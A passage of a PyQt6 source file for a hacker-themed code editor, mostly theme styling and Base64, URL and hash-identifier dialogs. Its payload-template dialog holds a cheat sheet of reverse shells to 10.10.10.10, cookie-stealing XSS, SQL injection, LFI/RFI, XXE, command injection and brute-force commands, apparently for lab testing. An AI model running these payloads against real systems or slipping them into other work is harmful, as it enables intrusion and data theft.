                label.setStyleSheet(f"color: {c.get('sidebar_title', '#00ff41')};")
            elif "ULTIMATE PYQT6 EDITION" in label.text():
                label.setStyleSheet(f"color: {c.get('sidebar_version', '#ff0066')};")
            elif any(keyword in label.text() for keyword in ["CLASSIFIED TOOLS", "CLASSIFIED THEMES", "DISPLAY SETTINGS"]):
                label.setStyleSheet(f"color: {c.get('sidebar_labels', '#00ffaa')};")
    
        # === SIDEBAR BUTTONS (general style) ===
        for widget in self.findChildren(QPushButton):
            if widget.objectName() and widget.objectName().startswith('btn_'):
                # Skip individual buttons - they'll be styled separately
                continue
            # Apply general sidebar button style
            widget.setStyleSheet(f"""
                QPushButton {{
                    background: {c.get('sidebar_btn_bg', '#002200')};
                    color: {c.get('sidebar_btn_text', '#00ff41')};
                    border: 2px solid {c.get('sidebar_btn_border', '#00ff41')};
                    border-radius: 8px;
                    padding: 12px;
                    margin: 5px;
                }}
                QPushButton:hover {{
                    background: #005500;
                    border: 2px solid #00ff88;
                }}
            """)
    
        # === INDIVIDUAL BUTTONS ===
        button_names = [
            'btn_new_tab', 'btn_open_file', 'btn_save_file', 'btn_run',
            'btn_explorer', 'btn_sidebar_toggle', 'btn_customize',
            'btn_base64_tool', 'btn_url_tool', 'btn_hash_tool', 'btn_templates'
        ]
    
        for btn_name in button_names:
            self.apply_individual_button_style(btn_name, c)
    
        # === SIDEBAR COMBOBOX ===
        if hasattr(self, 'theme_combo'):
            self.theme_combo.setStyleSheet(f"""
                QComboBox {{
                    background: {c.get('sidebar_combo', '#001122')};
                    color: #00ffaa;
                    border: 1px solid #00ff41;
                    border-radius: 4px;
                    padding: 8px;
                }}
            """)
    
        # === TOOLBAR ===
        toolbar = self.findChild(QToolBar)
        if toolbar:
            toolbar.setStyleSheet(f"""
                QToolBar {{
                    background: {c.get('toolbar_bg', '#111122')};
                    padding: 5px;
                }}
            """)
    
        # === CONSOLE ===
        if hasattr(self, 'output_console'):
            self.output_console.setStyleSheet(f"""
                QPlainTextEdit {{
                    background: {c.get('console_bg', 'transparent')};
                    color: {c.get('console_text', '#ff4444')};
                    border-top: 2px solid {c.get('console_border', '#ff4444')};
                    font-family: Consolas;
                    font-size: 12pt;
                }}
            """)
    
        # === EDITORS ===
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setStyleSheet(f"""
                    QPlainTextEdit {{
                        background: {c.get('editor_bg', 'transparent')};
                        color: {c.get('editor_text', '#00ff41')};
                        selection-background-color: {c.get('editor_selection', '#003300')};
                        border: none;
                    }}
                """)
        
                # Update line numbers area
                if hasattr(tab.editor, 'line_number_area'):
                    tab.editor.line_number_area.update()
        
                # Update syntax highlighter
                if hasattr(tab, 'highlighter'):
                    tab.highlighter.parent_window = self
                    tab.highlighter.update_colors()
    
        # === STATUS BAR ===
        if hasattr(self, 'status_bar'):
            self.status_bar.setStyleSheet(f"""
                QStatusBar {{
                    background: {c.get('status_bg', '#330000')};
                    color: {c.get('status_text', '#ff0066')};
                    font-weight: bold;
                    border-top: 2px solid {c.get('status_border', '#ff0066')};
                }}
            """)
    
        if not preview:
            self.status_bar.showMessage("CUSTOM COLORS APPLIED")

    def apply_individual_button_style(self, button_obj_name, colors):
        """Apply custom style to an individual button - FIXED VERSION"""
        # Map object names to color keys
        color_prefix_map = {
            'btn_new_tab': 'btn_new_tab',
            'btn_open_file': 'btn_open_file',
            'btn_save_file': 'btn_save_file',
            'btn_run': 'btn_run',
            'btn_explorer': 'btn_explorer',
            'btn_sidebar_toggle': 'btn_sidebar_toggle',
            'btn_customize': 'btn_customize',
            'btn_base64_tool': 'btn_base64_tool',
            'btn_url_tool': 'btn_url_tool',
            'btn_hash_tool': 'btn_hash_tool',
            'btn_templates': 'btn_templates'
        }
    
        if button_obj_name not in color_prefix_map:
            return
    
        color_prefix = color_prefix_map[button_obj_name]
    
        # Get colors for this button
        bg = colors.get(f'{color_prefix}_bg')
        text = colors.get(f'{color_prefix}_text')
        border = colors.get(f'{color_prefix}_border')
        hover = colors.get(f'{color_prefix}_hover')
    
        # Build the stylesheet
        style = ""
        if bg or text or border:
            style += f"""QPushButton {{
                background: {bg or '#003300'};
                color: {text or '#00ff41'};
                border: 2px solid {border or '#00ff41'};
                border-radius: 8px;
                padding: 12px;
                margin: 5px;
            }}"""
    
        if hover:
            style += f"""
            QPushButton:hover {{
                background: {hover};
                border: 2px solid #00ff88;
            }}"""
        else:
            style += """
            QPushButton:hover {
                background: #005500;
                border: 2px solid #00ff88;
            }"""
    
        # Apply to QPushButton widgets
        for widget in self.findChildren(QPushButton):
            if widget.objectName() == button_obj_name:
                widget.setStyleSheet(style)
                break

    def style_individual_button(self, button_key, color_value):
        """Style an individual button by its key name"""
        # Extract button name from key (e.g., "btn_new_tab_bg" -> "NEW TAB")
        parts = button_key.split('_')
        if len(parts) < 3:  # Need at least "btn", "name", "type"
            return
    
        color_type = parts[-1]  # "bg", "text", "border", or "hover"
        button_name_parts = parts[1:-1]  # ["new", "tab"]
        button_name_search = " ".join(button_name_parts).upper()  # "NEW TAB"
    
        # Find all buttons
        for widget in self.findChildren(QPushButton):
            widget_text = widget.text().upper()
        
            # Check if this is our button
            if button_name_search in widget_text:
                current_style = widget.styleSheet() or ""
            
                # Parse current style into a dictionary
                style_dict = self.parse_style_to_dict(current_style)
            
                # Update the style based on color type
                if color_type == 'bg':
                    style_dict['background-color'] = color_value
                elif color_type == 'text':
                    style_dict['color'] = color_value
                elif color_type == 'border':
                    style_dict['border'] = f'2px solid {color_value}'
                elif color_type == 'hover':
                    # Handle hover separately
                    hover_style = current_style
                    if 'QPushButton:hover' not in hover_style:
                        hover_style += f"\nQPushButton:hover {{ background-color: {color_value}; }}"
                    else:
                        # Update existing hover rule
                        hover_style = self.update_css_rule(hover_style, 'QPushButton:hover', 'background-color', color_value)
                    widget.setStyleSheet(hover_style)
                    return
            
                # Convert dictionary back to CSS
                new_style = self.dict_to_css(style_dict, 'QPushButton')
            
                # Apply the style
                try:
                    widget.setStyleSheet(new_style)
                    print(f"DEBUG: Styled button '{button_name_search}' ({color_type} = {color_value})")
                except Exception as e:
                    print(f"Error styling button {button_name_search}: {e}")
                break
                
    def parse_style_to_dict(self, css_string):
        """Parse CSS string into a dictionary"""
        style_dict = {}
    
        # Remove comments and normalize
        css_string = css_string.split('/*')[0].strip()
    
        # Parse properties
        lines = css_string.split(';')
        for line in lines:
            line = line.strip()
            if ':' in line:
                prop, value = line.split(':', 1)
                style_dict[prop.strip()] = value.strip()
    
        return style_dict

    def dict_to_css(self, style_dict, selector):
        """Convert style dictionary to CSS string"""
        if not style_dict:
            return ""
    
        css_lines = []
        for prop, value in style_dict.items():
            css_lines.append(f"    {prop}: {value};")
    
        return f"{selector} {{\n" + "\n".join(css_lines) + "\n}"

    def update_css_rule(self, css_string, selector, property_name, value):
        """Update a specific CSS rule"""
        lines = css_string.split('\n')
        in_selector = False
        updated = False
    
        for i, line in enumerate(lines):
            line = line.strip()
        
            if line.startswith(selector):
                in_selector = True
            elif in_selector and line.startswith('}'):
                in_selector = False
        
            if in_selector and property_name in line and ':' in line:
                lines[i] = f"    {property_name}: {value};"
                updated = True
    
        if not updated and selector in css_string:
            # Add the property to existing selector
            for i, line in enumerate(lines):
                if line.strip() == selector + ' {':
                    # Insert after the opening brace
                    lines.insert(i + 1, f"    {property_name}: {value};")
                    break
    
        return '\n'.join(lines)

    def update_style_property(self, style_string, property_name, value, state=''):
        """Update a CSS property in a style string - FIXED VERSION"""
        # Clean up the style string first
        style_string = style_string.strip()
    
        # Parse into sections
        sections = []
        current_section = []
        in_rule = False
        brace_count = 0
    
        # Simple parser to handle CSS rules with nested braces
        for char in style_string:
            if char == '{':
                brace_count += 1
                in_rule = True
                current_section.append(char)
            elif char == '}':
                brace_count -= 1
                current_section.append(char)
                if brace_count == 0:
                    sections.append(''.join(current_section))
                    current_section = []
                    in_rule = False
            else:
                current_section.append(char)
    
        # Handle any remaining section
        if current_section:
            sections.append(''.join(current_section))
    
        # If no proper sections found, treat as inline style
        if not sections or not any('{' in s for s in sections):
            # Simple inline style update
            lines = [s.strip() for s in style_string.split(';') if s.strip()]
            updated = False
        
            for i, line in enumerate(lines):
                if line.startswith(property_name):
                    lines[i] = f"{property_name}: {value}"
                    updated = True
                    break
        
            if not updated:
                lines.append(f"{property_name}: {value}")
        
            return '; '.join(lines) + ';' if lines else ''
    
        # Complex: we have CSS rules
        result_sections = []
        for section in sections:
            if state and state in section:
                # Update property in this state rule
                lines = [l.strip() for l in section.split('\n')]
                for i, line in enumerate(lines):
                    if ':' in line and property_name in line.split(':')[0]:
                        lines[i] = f"    {property_name}: {value};"
                        break
                    elif i > 0 and ':' not in line and '}' not in line:
                        # Insert at end of properties
                        lines.insert(i, f"    {property_name}: {value};")
                        break
                result_sections.append('\n'.join(lines))
            elif not state and ':' in section and '{' not in section:
                # Inline property
                if property_name in section.split(':')[0]:
                    result_sections.append(f"{property_name}: {value};")
                else:
                    result_sections.append(section)
            else:
                result_sections.append(section)
    
        return '\n'.join(result_sections)
        
    def validate_css(self, css_string):
        """Simple CSS validation to catch common errors"""
        if not css_string:
            return True
    
        # Check for unclosed braces
        if css_string.count('{') != css_string.count('}'):
            print(f"CSS Error: Unmatched braces in: {css_string[:50]}...")
            return False
    
        # Check for empty rules
        if '{}' in css_string:
            print(f"CSS Error: Empty rule in: {css_string[:50]}...")
            return False
    
        # Check for missing semicolons in properties (basic check)
        lines = css_string.split(';')
        for i, line in enumerate(lines[:-1]):  # Skip last empty segment
            if line.strip() and ':' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    prop = parts[0].strip()
                    value = ':'.join(parts[1:]).strip()
                    if not value:
                        print(f"CSS Warning: Empty value for property '{prop}'")
    
        return True

    def save_custom_colors(self, colors):
        """Save custom colors to a JSON file"""
        import json
        config_dir = os.path.join(os.path.expanduser('~'), '.leviathan_edit')
    
        if not os.path.exists(config_dir):
            os.makedirs(config_dir)
    
        config_file = os.path.join(config_dir, 'custom_colors.json')
    
        try:
            with open(config_file, 'w') as f:
                json.dump(colors, f, indent=4)
        except Exception as e:
            print(f"Error saving colors: {e}")

    def load_custom_colors(self):
        """Load custom colors from JSON file"""
        import json
        config_file = os.path.join(os.path.expanduser('~'), '.leviathan_edit', 'custom_colors.json')
    
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_colors = json.load(f)
                
                    # Instead of replacing the entire dictionary, only update the keys that exist
                    # This ensures we keep all the default theme keys
                    for key, value in loaded_colors.items():
                        self.custom_colors[key] = value
                    
                    return loaded_colors
            except:
                # If there's any error, fall back to default theme
                self.custom_colors = self.themes[self.current_theme].copy()
        else:
            # No custom colors file, use theme defaults
            self.custom_colors = self.themes[self.current_theme].copy()
    
        return self.custom_colors

    def reset_to_theme(self):
        """Reset to current theme colors"""
        self.load_theme(self.current_theme)
        
# ================= TOOL DIALOGS =================

class Base64ToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("BASE64 ENCODER/DECODER")
        self.setFixedSize(600, 500)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
                min-width: 150px;
                min-height: 40px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 2px solid #00ff88;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("INPUT:")
        input_label.setFont(QFont("Consolas", 14))
        layout.addWidget(input_label)
        
        self.input_text = QTextEdit()
        self.input_text.setMaximumHeight(100)
        layout.addWidget(self.input_text)
        
        # Output
        output_label = QLabel("OUTPUT:")
        output_label.setFont(QFont("Consolas", 14))
        layout.addWidget(output_label)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(100)
        layout.addWidget(self.output_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        encode_btn = QPushButton("ENCODE")
        encode_btn.setFixedHeight(45)
        encode_btn.clicked.connect(self.encode)
        button_layout.addWidget(encode_btn)
        
        decode_btn = QPushButton("DECODE")
        decode_btn.setFixedHeight(45)
        decode_btn.clicked.connect(self.decode)
        button_layout.addWidget(decode_btn)
        
        layout.addLayout(button_layout)
        layout.addStretch()
        
        self.setLayout(layout)
    
    def encode(self):
        text = self.input_text.toPlainText()
        encoded = base64.b64encode(text.encode()).decode()
        self.output_text.setPlainText(encoded)
    
    def decode(self):
        text = self.input_text.toPlainText()
        try:
            decoded = base64.b64decode(text.encode()).decode()
            self.output_text.setPlainText(decoded)
        except:
            self.output_text.setPlainText("ERROR: Invalid Base64")

class URLToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("URL ENCODER/DECODER")
        self.setFixedSize(600, 500)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #330000, stop:1 #110000);
                color: #ff4444;
                border: 2px solid #ff4444;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
                min-width: 150px;
                min-height: 40px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #550000, stop:1 #330000);
                border: 2px solid #ff8888;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("INPUT:")
        input_label.setFont(QFont("Consolas", 14))
        layout.addWidget(input_label)
        
        self.input_text = QTextEdit()
        self.input_text.setMaximumHeight(100)
        layout.addWidget(self.input_text)
        
        # Output
        output_label = QLabel("OUTPUT:")
        output_label.setFont(QFont("Consolas", 14))
        layout.addWidget(output_label)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(100)
        layout.addWidget(self.output_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        encode_btn = QPushButton("ENCODE")
        encode_btn.setFixedHeight(45)
        encode_btn.clicked.connect(self.encode)
        button_layout.addWidget(encode_btn)
        
        decode_btn = QPushButton("DECODE")
        decode_btn.setFixedHeight(45)
        decode_btn.clicked.connect(self.decode)
        button_layout.addWidget(decode_btn)
        
        layout.addLayout(button_layout)
        layout.addStretch()
        
        self.setLayout(layout)
    
    def encode(self):
        text = self.input_text.toPlainText()
        encoded = urllib.parse.quote(text)
        self.output_text.setPlainText(encoded)
    
    def decode(self):
        text = self.input_text.toPlainText()
        decoded = urllib.parse.unquote(text)
        self.output_text.setPlainText(decoded)

class HashToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("HASH IDENTIFIER")
        self.setFixedSize(600, 400)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 12px;
                font-family: Consolas;
                font-size: 13pt;
                min-height: 40px;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("ENTER HASH:")
        input_label.setFont(QFont("Consolas", 14))
        layout.addWidget(input_label)
        
        self.hash_input = QLineEdit()
        layout.addWidget(self.hash_input)
        
        # Result
        result_label = QLabel("POSSIBLE HASH TYPES:")
        result_label.setFont(QFont("Consolas", 14))
        layout.addWidget(result_label)
        
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        
        # Button
        identify_btn = QPushButton("IDENTIFY HASH")
        identify_btn.clicked.connect(self.identify)
        layout.addWidget(identify_btn)
        
        self.setLayout(layout)
    
    def identify(self):
        hash_val = self.hash_input.text().strip()
        self.result_text.clear()
        
        if not hash_val:
            self.result_text.setPlainText("ERROR: No hash provided")
            return
        
        length = len(hash_val)
        results = []
        hex_pattern = r'^[a-fA-F0-9]+$'
        
        if length == 32 and re.match(hex_pattern, hash_val):
            results.append("MD5 (Message Digest 5)")
            results.append("NTLM (Windows)")
        
        if length == 40 and re.match(hex_pattern, hash_val):
            results.append("SHA-1 (Secure Hash Algorithm 1)")
        
        if length == 56 and re.match(hex_pattern, hash_val):
            results.append("SHA-224")
        
        if length == 64 and re.match(hex_pattern, hash_val):
            results.append("SHA-256")
            results.append("SHA3-256")
            results.append("Keccak-256")
        
        if length == 96 and re.match(hex_pattern, hash_val):
            results.append("SHA-384")
        
        if length == 128 and re.match(hex_pattern, hash_val):
            results.append("SHA-512")
            results.append("SHA3-512")
        
        if hash_val.startswith('$1'):
            results.append("MD5 Crypt")
        
        if hash_val.startswith('$2a') or hash_val.startswith('$2b') or hash_val.startswith('$2y'):
            results.append("bcrypt")
        
        if hash_val.startswith('$5'):
            results.append("SHA-256 Crypt")
        
        if hash_val.startswith('$6'):
            results.append("SHA-512 Crypt")
        
        if hash_val.startswith('$apr1'):
            results.append("APR1 (Apache)")
        
        if not results:
            results.append("UNKNOWN - Could not identify hash type")
            results.append(f"Length: {length} characters")
        
        output = "IDENTIFIED HASH TYPES:\n" + "="*60 + "\n"
        for i, r in enumerate(results, 1):
            output += f"{i}. {r}\n"
        
        self.result_text.setPlainText(output)

class TemplatesDialog(QDialog):
    def __init__(self, parent=None, custom_templates=None):
        super().__init__(parent)
        self.parent_editor = parent
        self.custom_templates = custom_templates or {}
        self.setWindowTitle("PAYLOAD TEMPLATES")
        self.resize(800, 600)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #ff0066;
                font-weight: bold;
                font-size: 14px;
            }
            QScrollArea {
                border: none;
                background: transparent;
            }
            QFrame {
                background: #001122;
                border: 2px solid #00ff41;
                border-radius: 8px;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 10px;
                font-weight: bold;
                border-radius: 4px;
                font-size: 12px;
                min-width: 200px;
                min-height: 35px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 1px solid #00ff88;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Title
        title = QLabel("CLASSIFIED PAYLOAD DATABASE")
        title.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)
        
        # Scroll area
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        container = QWidget()
        container_layout = QVBoxLayout(container)
        
        # Built-in templates
        builtin_label = QLabel("BUILT-IN TEMPLATES")
        builtin_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        builtin_label.setStyleSheet("color: #00ffaa;")
        container_layout.addWidget(builtin_label)
        
        templates = self.get_builtin_templates()
        for name, code in templates.items():
            frame = QFrame()
            frame_layout = QVBoxLayout(frame)
            
            name_label = QLabel(name)
            name_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            name_label.setStyleSheet("color: #00ffaa;")
            frame_layout.addWidget(name_label)
            
            insert_btn = QPushButton("INSERT INTO EDITOR")
            insert_btn.setFixedHeight(35)
            insert_btn.clicked.connect(lambda checked, c=code: self.insert_template(c))
            frame_layout.addWidget(insert_btn)
            
            container_layout.addWidget(frame)
        
        # Custom templates
        if self.custom_templates:
            custom_label = QLabel("CUSTOM TEMPLATES")
            custom_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
            custom_label.setStyleSheet("color: #ff6600;")
            container_layout.addWidget(custom_label)
            
            for name, code in self.custom_templates.items():
                frame = QFrame()
                frame.setStyleSheet("background: #112200; border: 2px solid #ffaa00;")
                frame_layout = QVBoxLayout(frame)
                
                name_label = QLabel(name)
                name_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
                name_label.setStyleSheet("color: #ffaa00;")
                frame_layout.addWidget(name_label)
                
                insert_btn = QPushButton("INSERT INTO EDITOR")
                insert_btn.setFixedHeight(35)
                insert_btn.clicked.connect(lambda checked, c=code: self.insert_template(c))
                frame_layout.addWidget(insert_btn)
                
                container_layout.addWidget(frame)
        
        container_layout.addStretch()
        scroll.setWidget(container)
        layout.addWidget(scroll)
        
        self.setLayout(layout)
    
    def get_builtin_templates(self):
        """Return built-in templates"""
        return {
            "PYTHON REVERSE SHELL": '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            
            "BASH REVERSE SHELL": '''bash -i >& /dev/tcp/10.10.10.10/4444 0>&1''',
            
            "POWERSHELL REVERSE SHELL": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''',
            
            "NETCAT LISTENER": '''nc -lvnp 4444''',
            
            "XSS BASIC": '''<script>alert(document.cookie)</script>''',
            
            "XSS IMG TAG": '''<img src=x onerror=alert(document.cookie)>''',
            
            "XSS ADVANCED": '''<svg/onload=alert(String.fromCharCode(88,83,83))>''',
            
            "SQL INJECTION UNION": """' UNION SELECT NULL,NULL,NULL--""",
            
            "SQL INJECTION AUTH BYPASS": """' OR '1'='1' --""",
            
            "SQL INJECTION TIME BASED": """' OR IF(1=1, SLEEP(5), 0)--""",
            
            "NMAP AGGRESSIVE SCAN": '''nmap -A -T4 -p- 10.10.10.10''',
            
            "NMAP VULN SCAN": '''nmap -sV --script vuln 10.10.10.10''',
            
            "NMAP SERVICE SCAN": '''nmap -sV -sC -p- 10.10.10.10 -oN scan.txt''',
            
            "METASPLOIT HANDLER": '''use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit''',
            
            "GOBUSTER DIR SCAN": '''gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt''',
            
            "FFUF WEB FUZZING": '''ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt''',
            
            "SQLMAP BASIC": '''sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs''',
            
            "CURL POST REQUEST": '''curl -X POST http://10.10.10.10/login -d "username=admin&password=password"''',
            
            "LFI PAYLOAD": '''../../../etc/passwd''',
            
            "RFI PAYLOAD": '''http://attacker.com/shell.txt?''',
            
            "XXE INJECTION": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>''',
            
            "COMMAND INJECTION": '''; cat /etc/passwd #''',
            
            "SMBCLIENT CONNECT": '''smbclient //10.10.10.10/share -U username''',
            
            "HYDRA SSH BRUTE": '''hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10''',
        }
    
    def insert_template(self, code):
        """Insert template into parent editor"""
        if self.parent_editor:
            current_editor = self.parent_editor.current_editor()
            if current_editor:
                current_editor.insertPlainText("\n" + code + "\n")
        self.close()

def main():
    # Set environment variables for HiDPI scaling BEFORE creating the application
    import os
    os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
    os.environ["QT_SCALE_FACTOR"] = "1"
    os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
    
    app = QApplication(sys.argv)
    
    # HiDPI handling
    try:
        app.setHighDpiScaleFactorRoundingPolicy(
            Qt.HighDpiScaleFactorRoundingPolicy.PassThrough
        )
        if hasattr(Qt.ApplicationAttribute, 'AA_EnableHighDpiScaling'):
            app.setAttribute(Qt.ApplicationAttribute.AA_EnableHighDpiScaling, True)
        if hasattr(Qt.ApplicationAttribute, 'AA_UseHighDpiPixmaps'):
            app.setAttribute(Qt.ApplicationAttribute.AA_UseHighDpiPixmaps, True)
    except AttributeError:
        print("Note: Using environment variables for HiDPI scaling")
    
    # Create and show window
    window = LeviathanEditUltimate()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()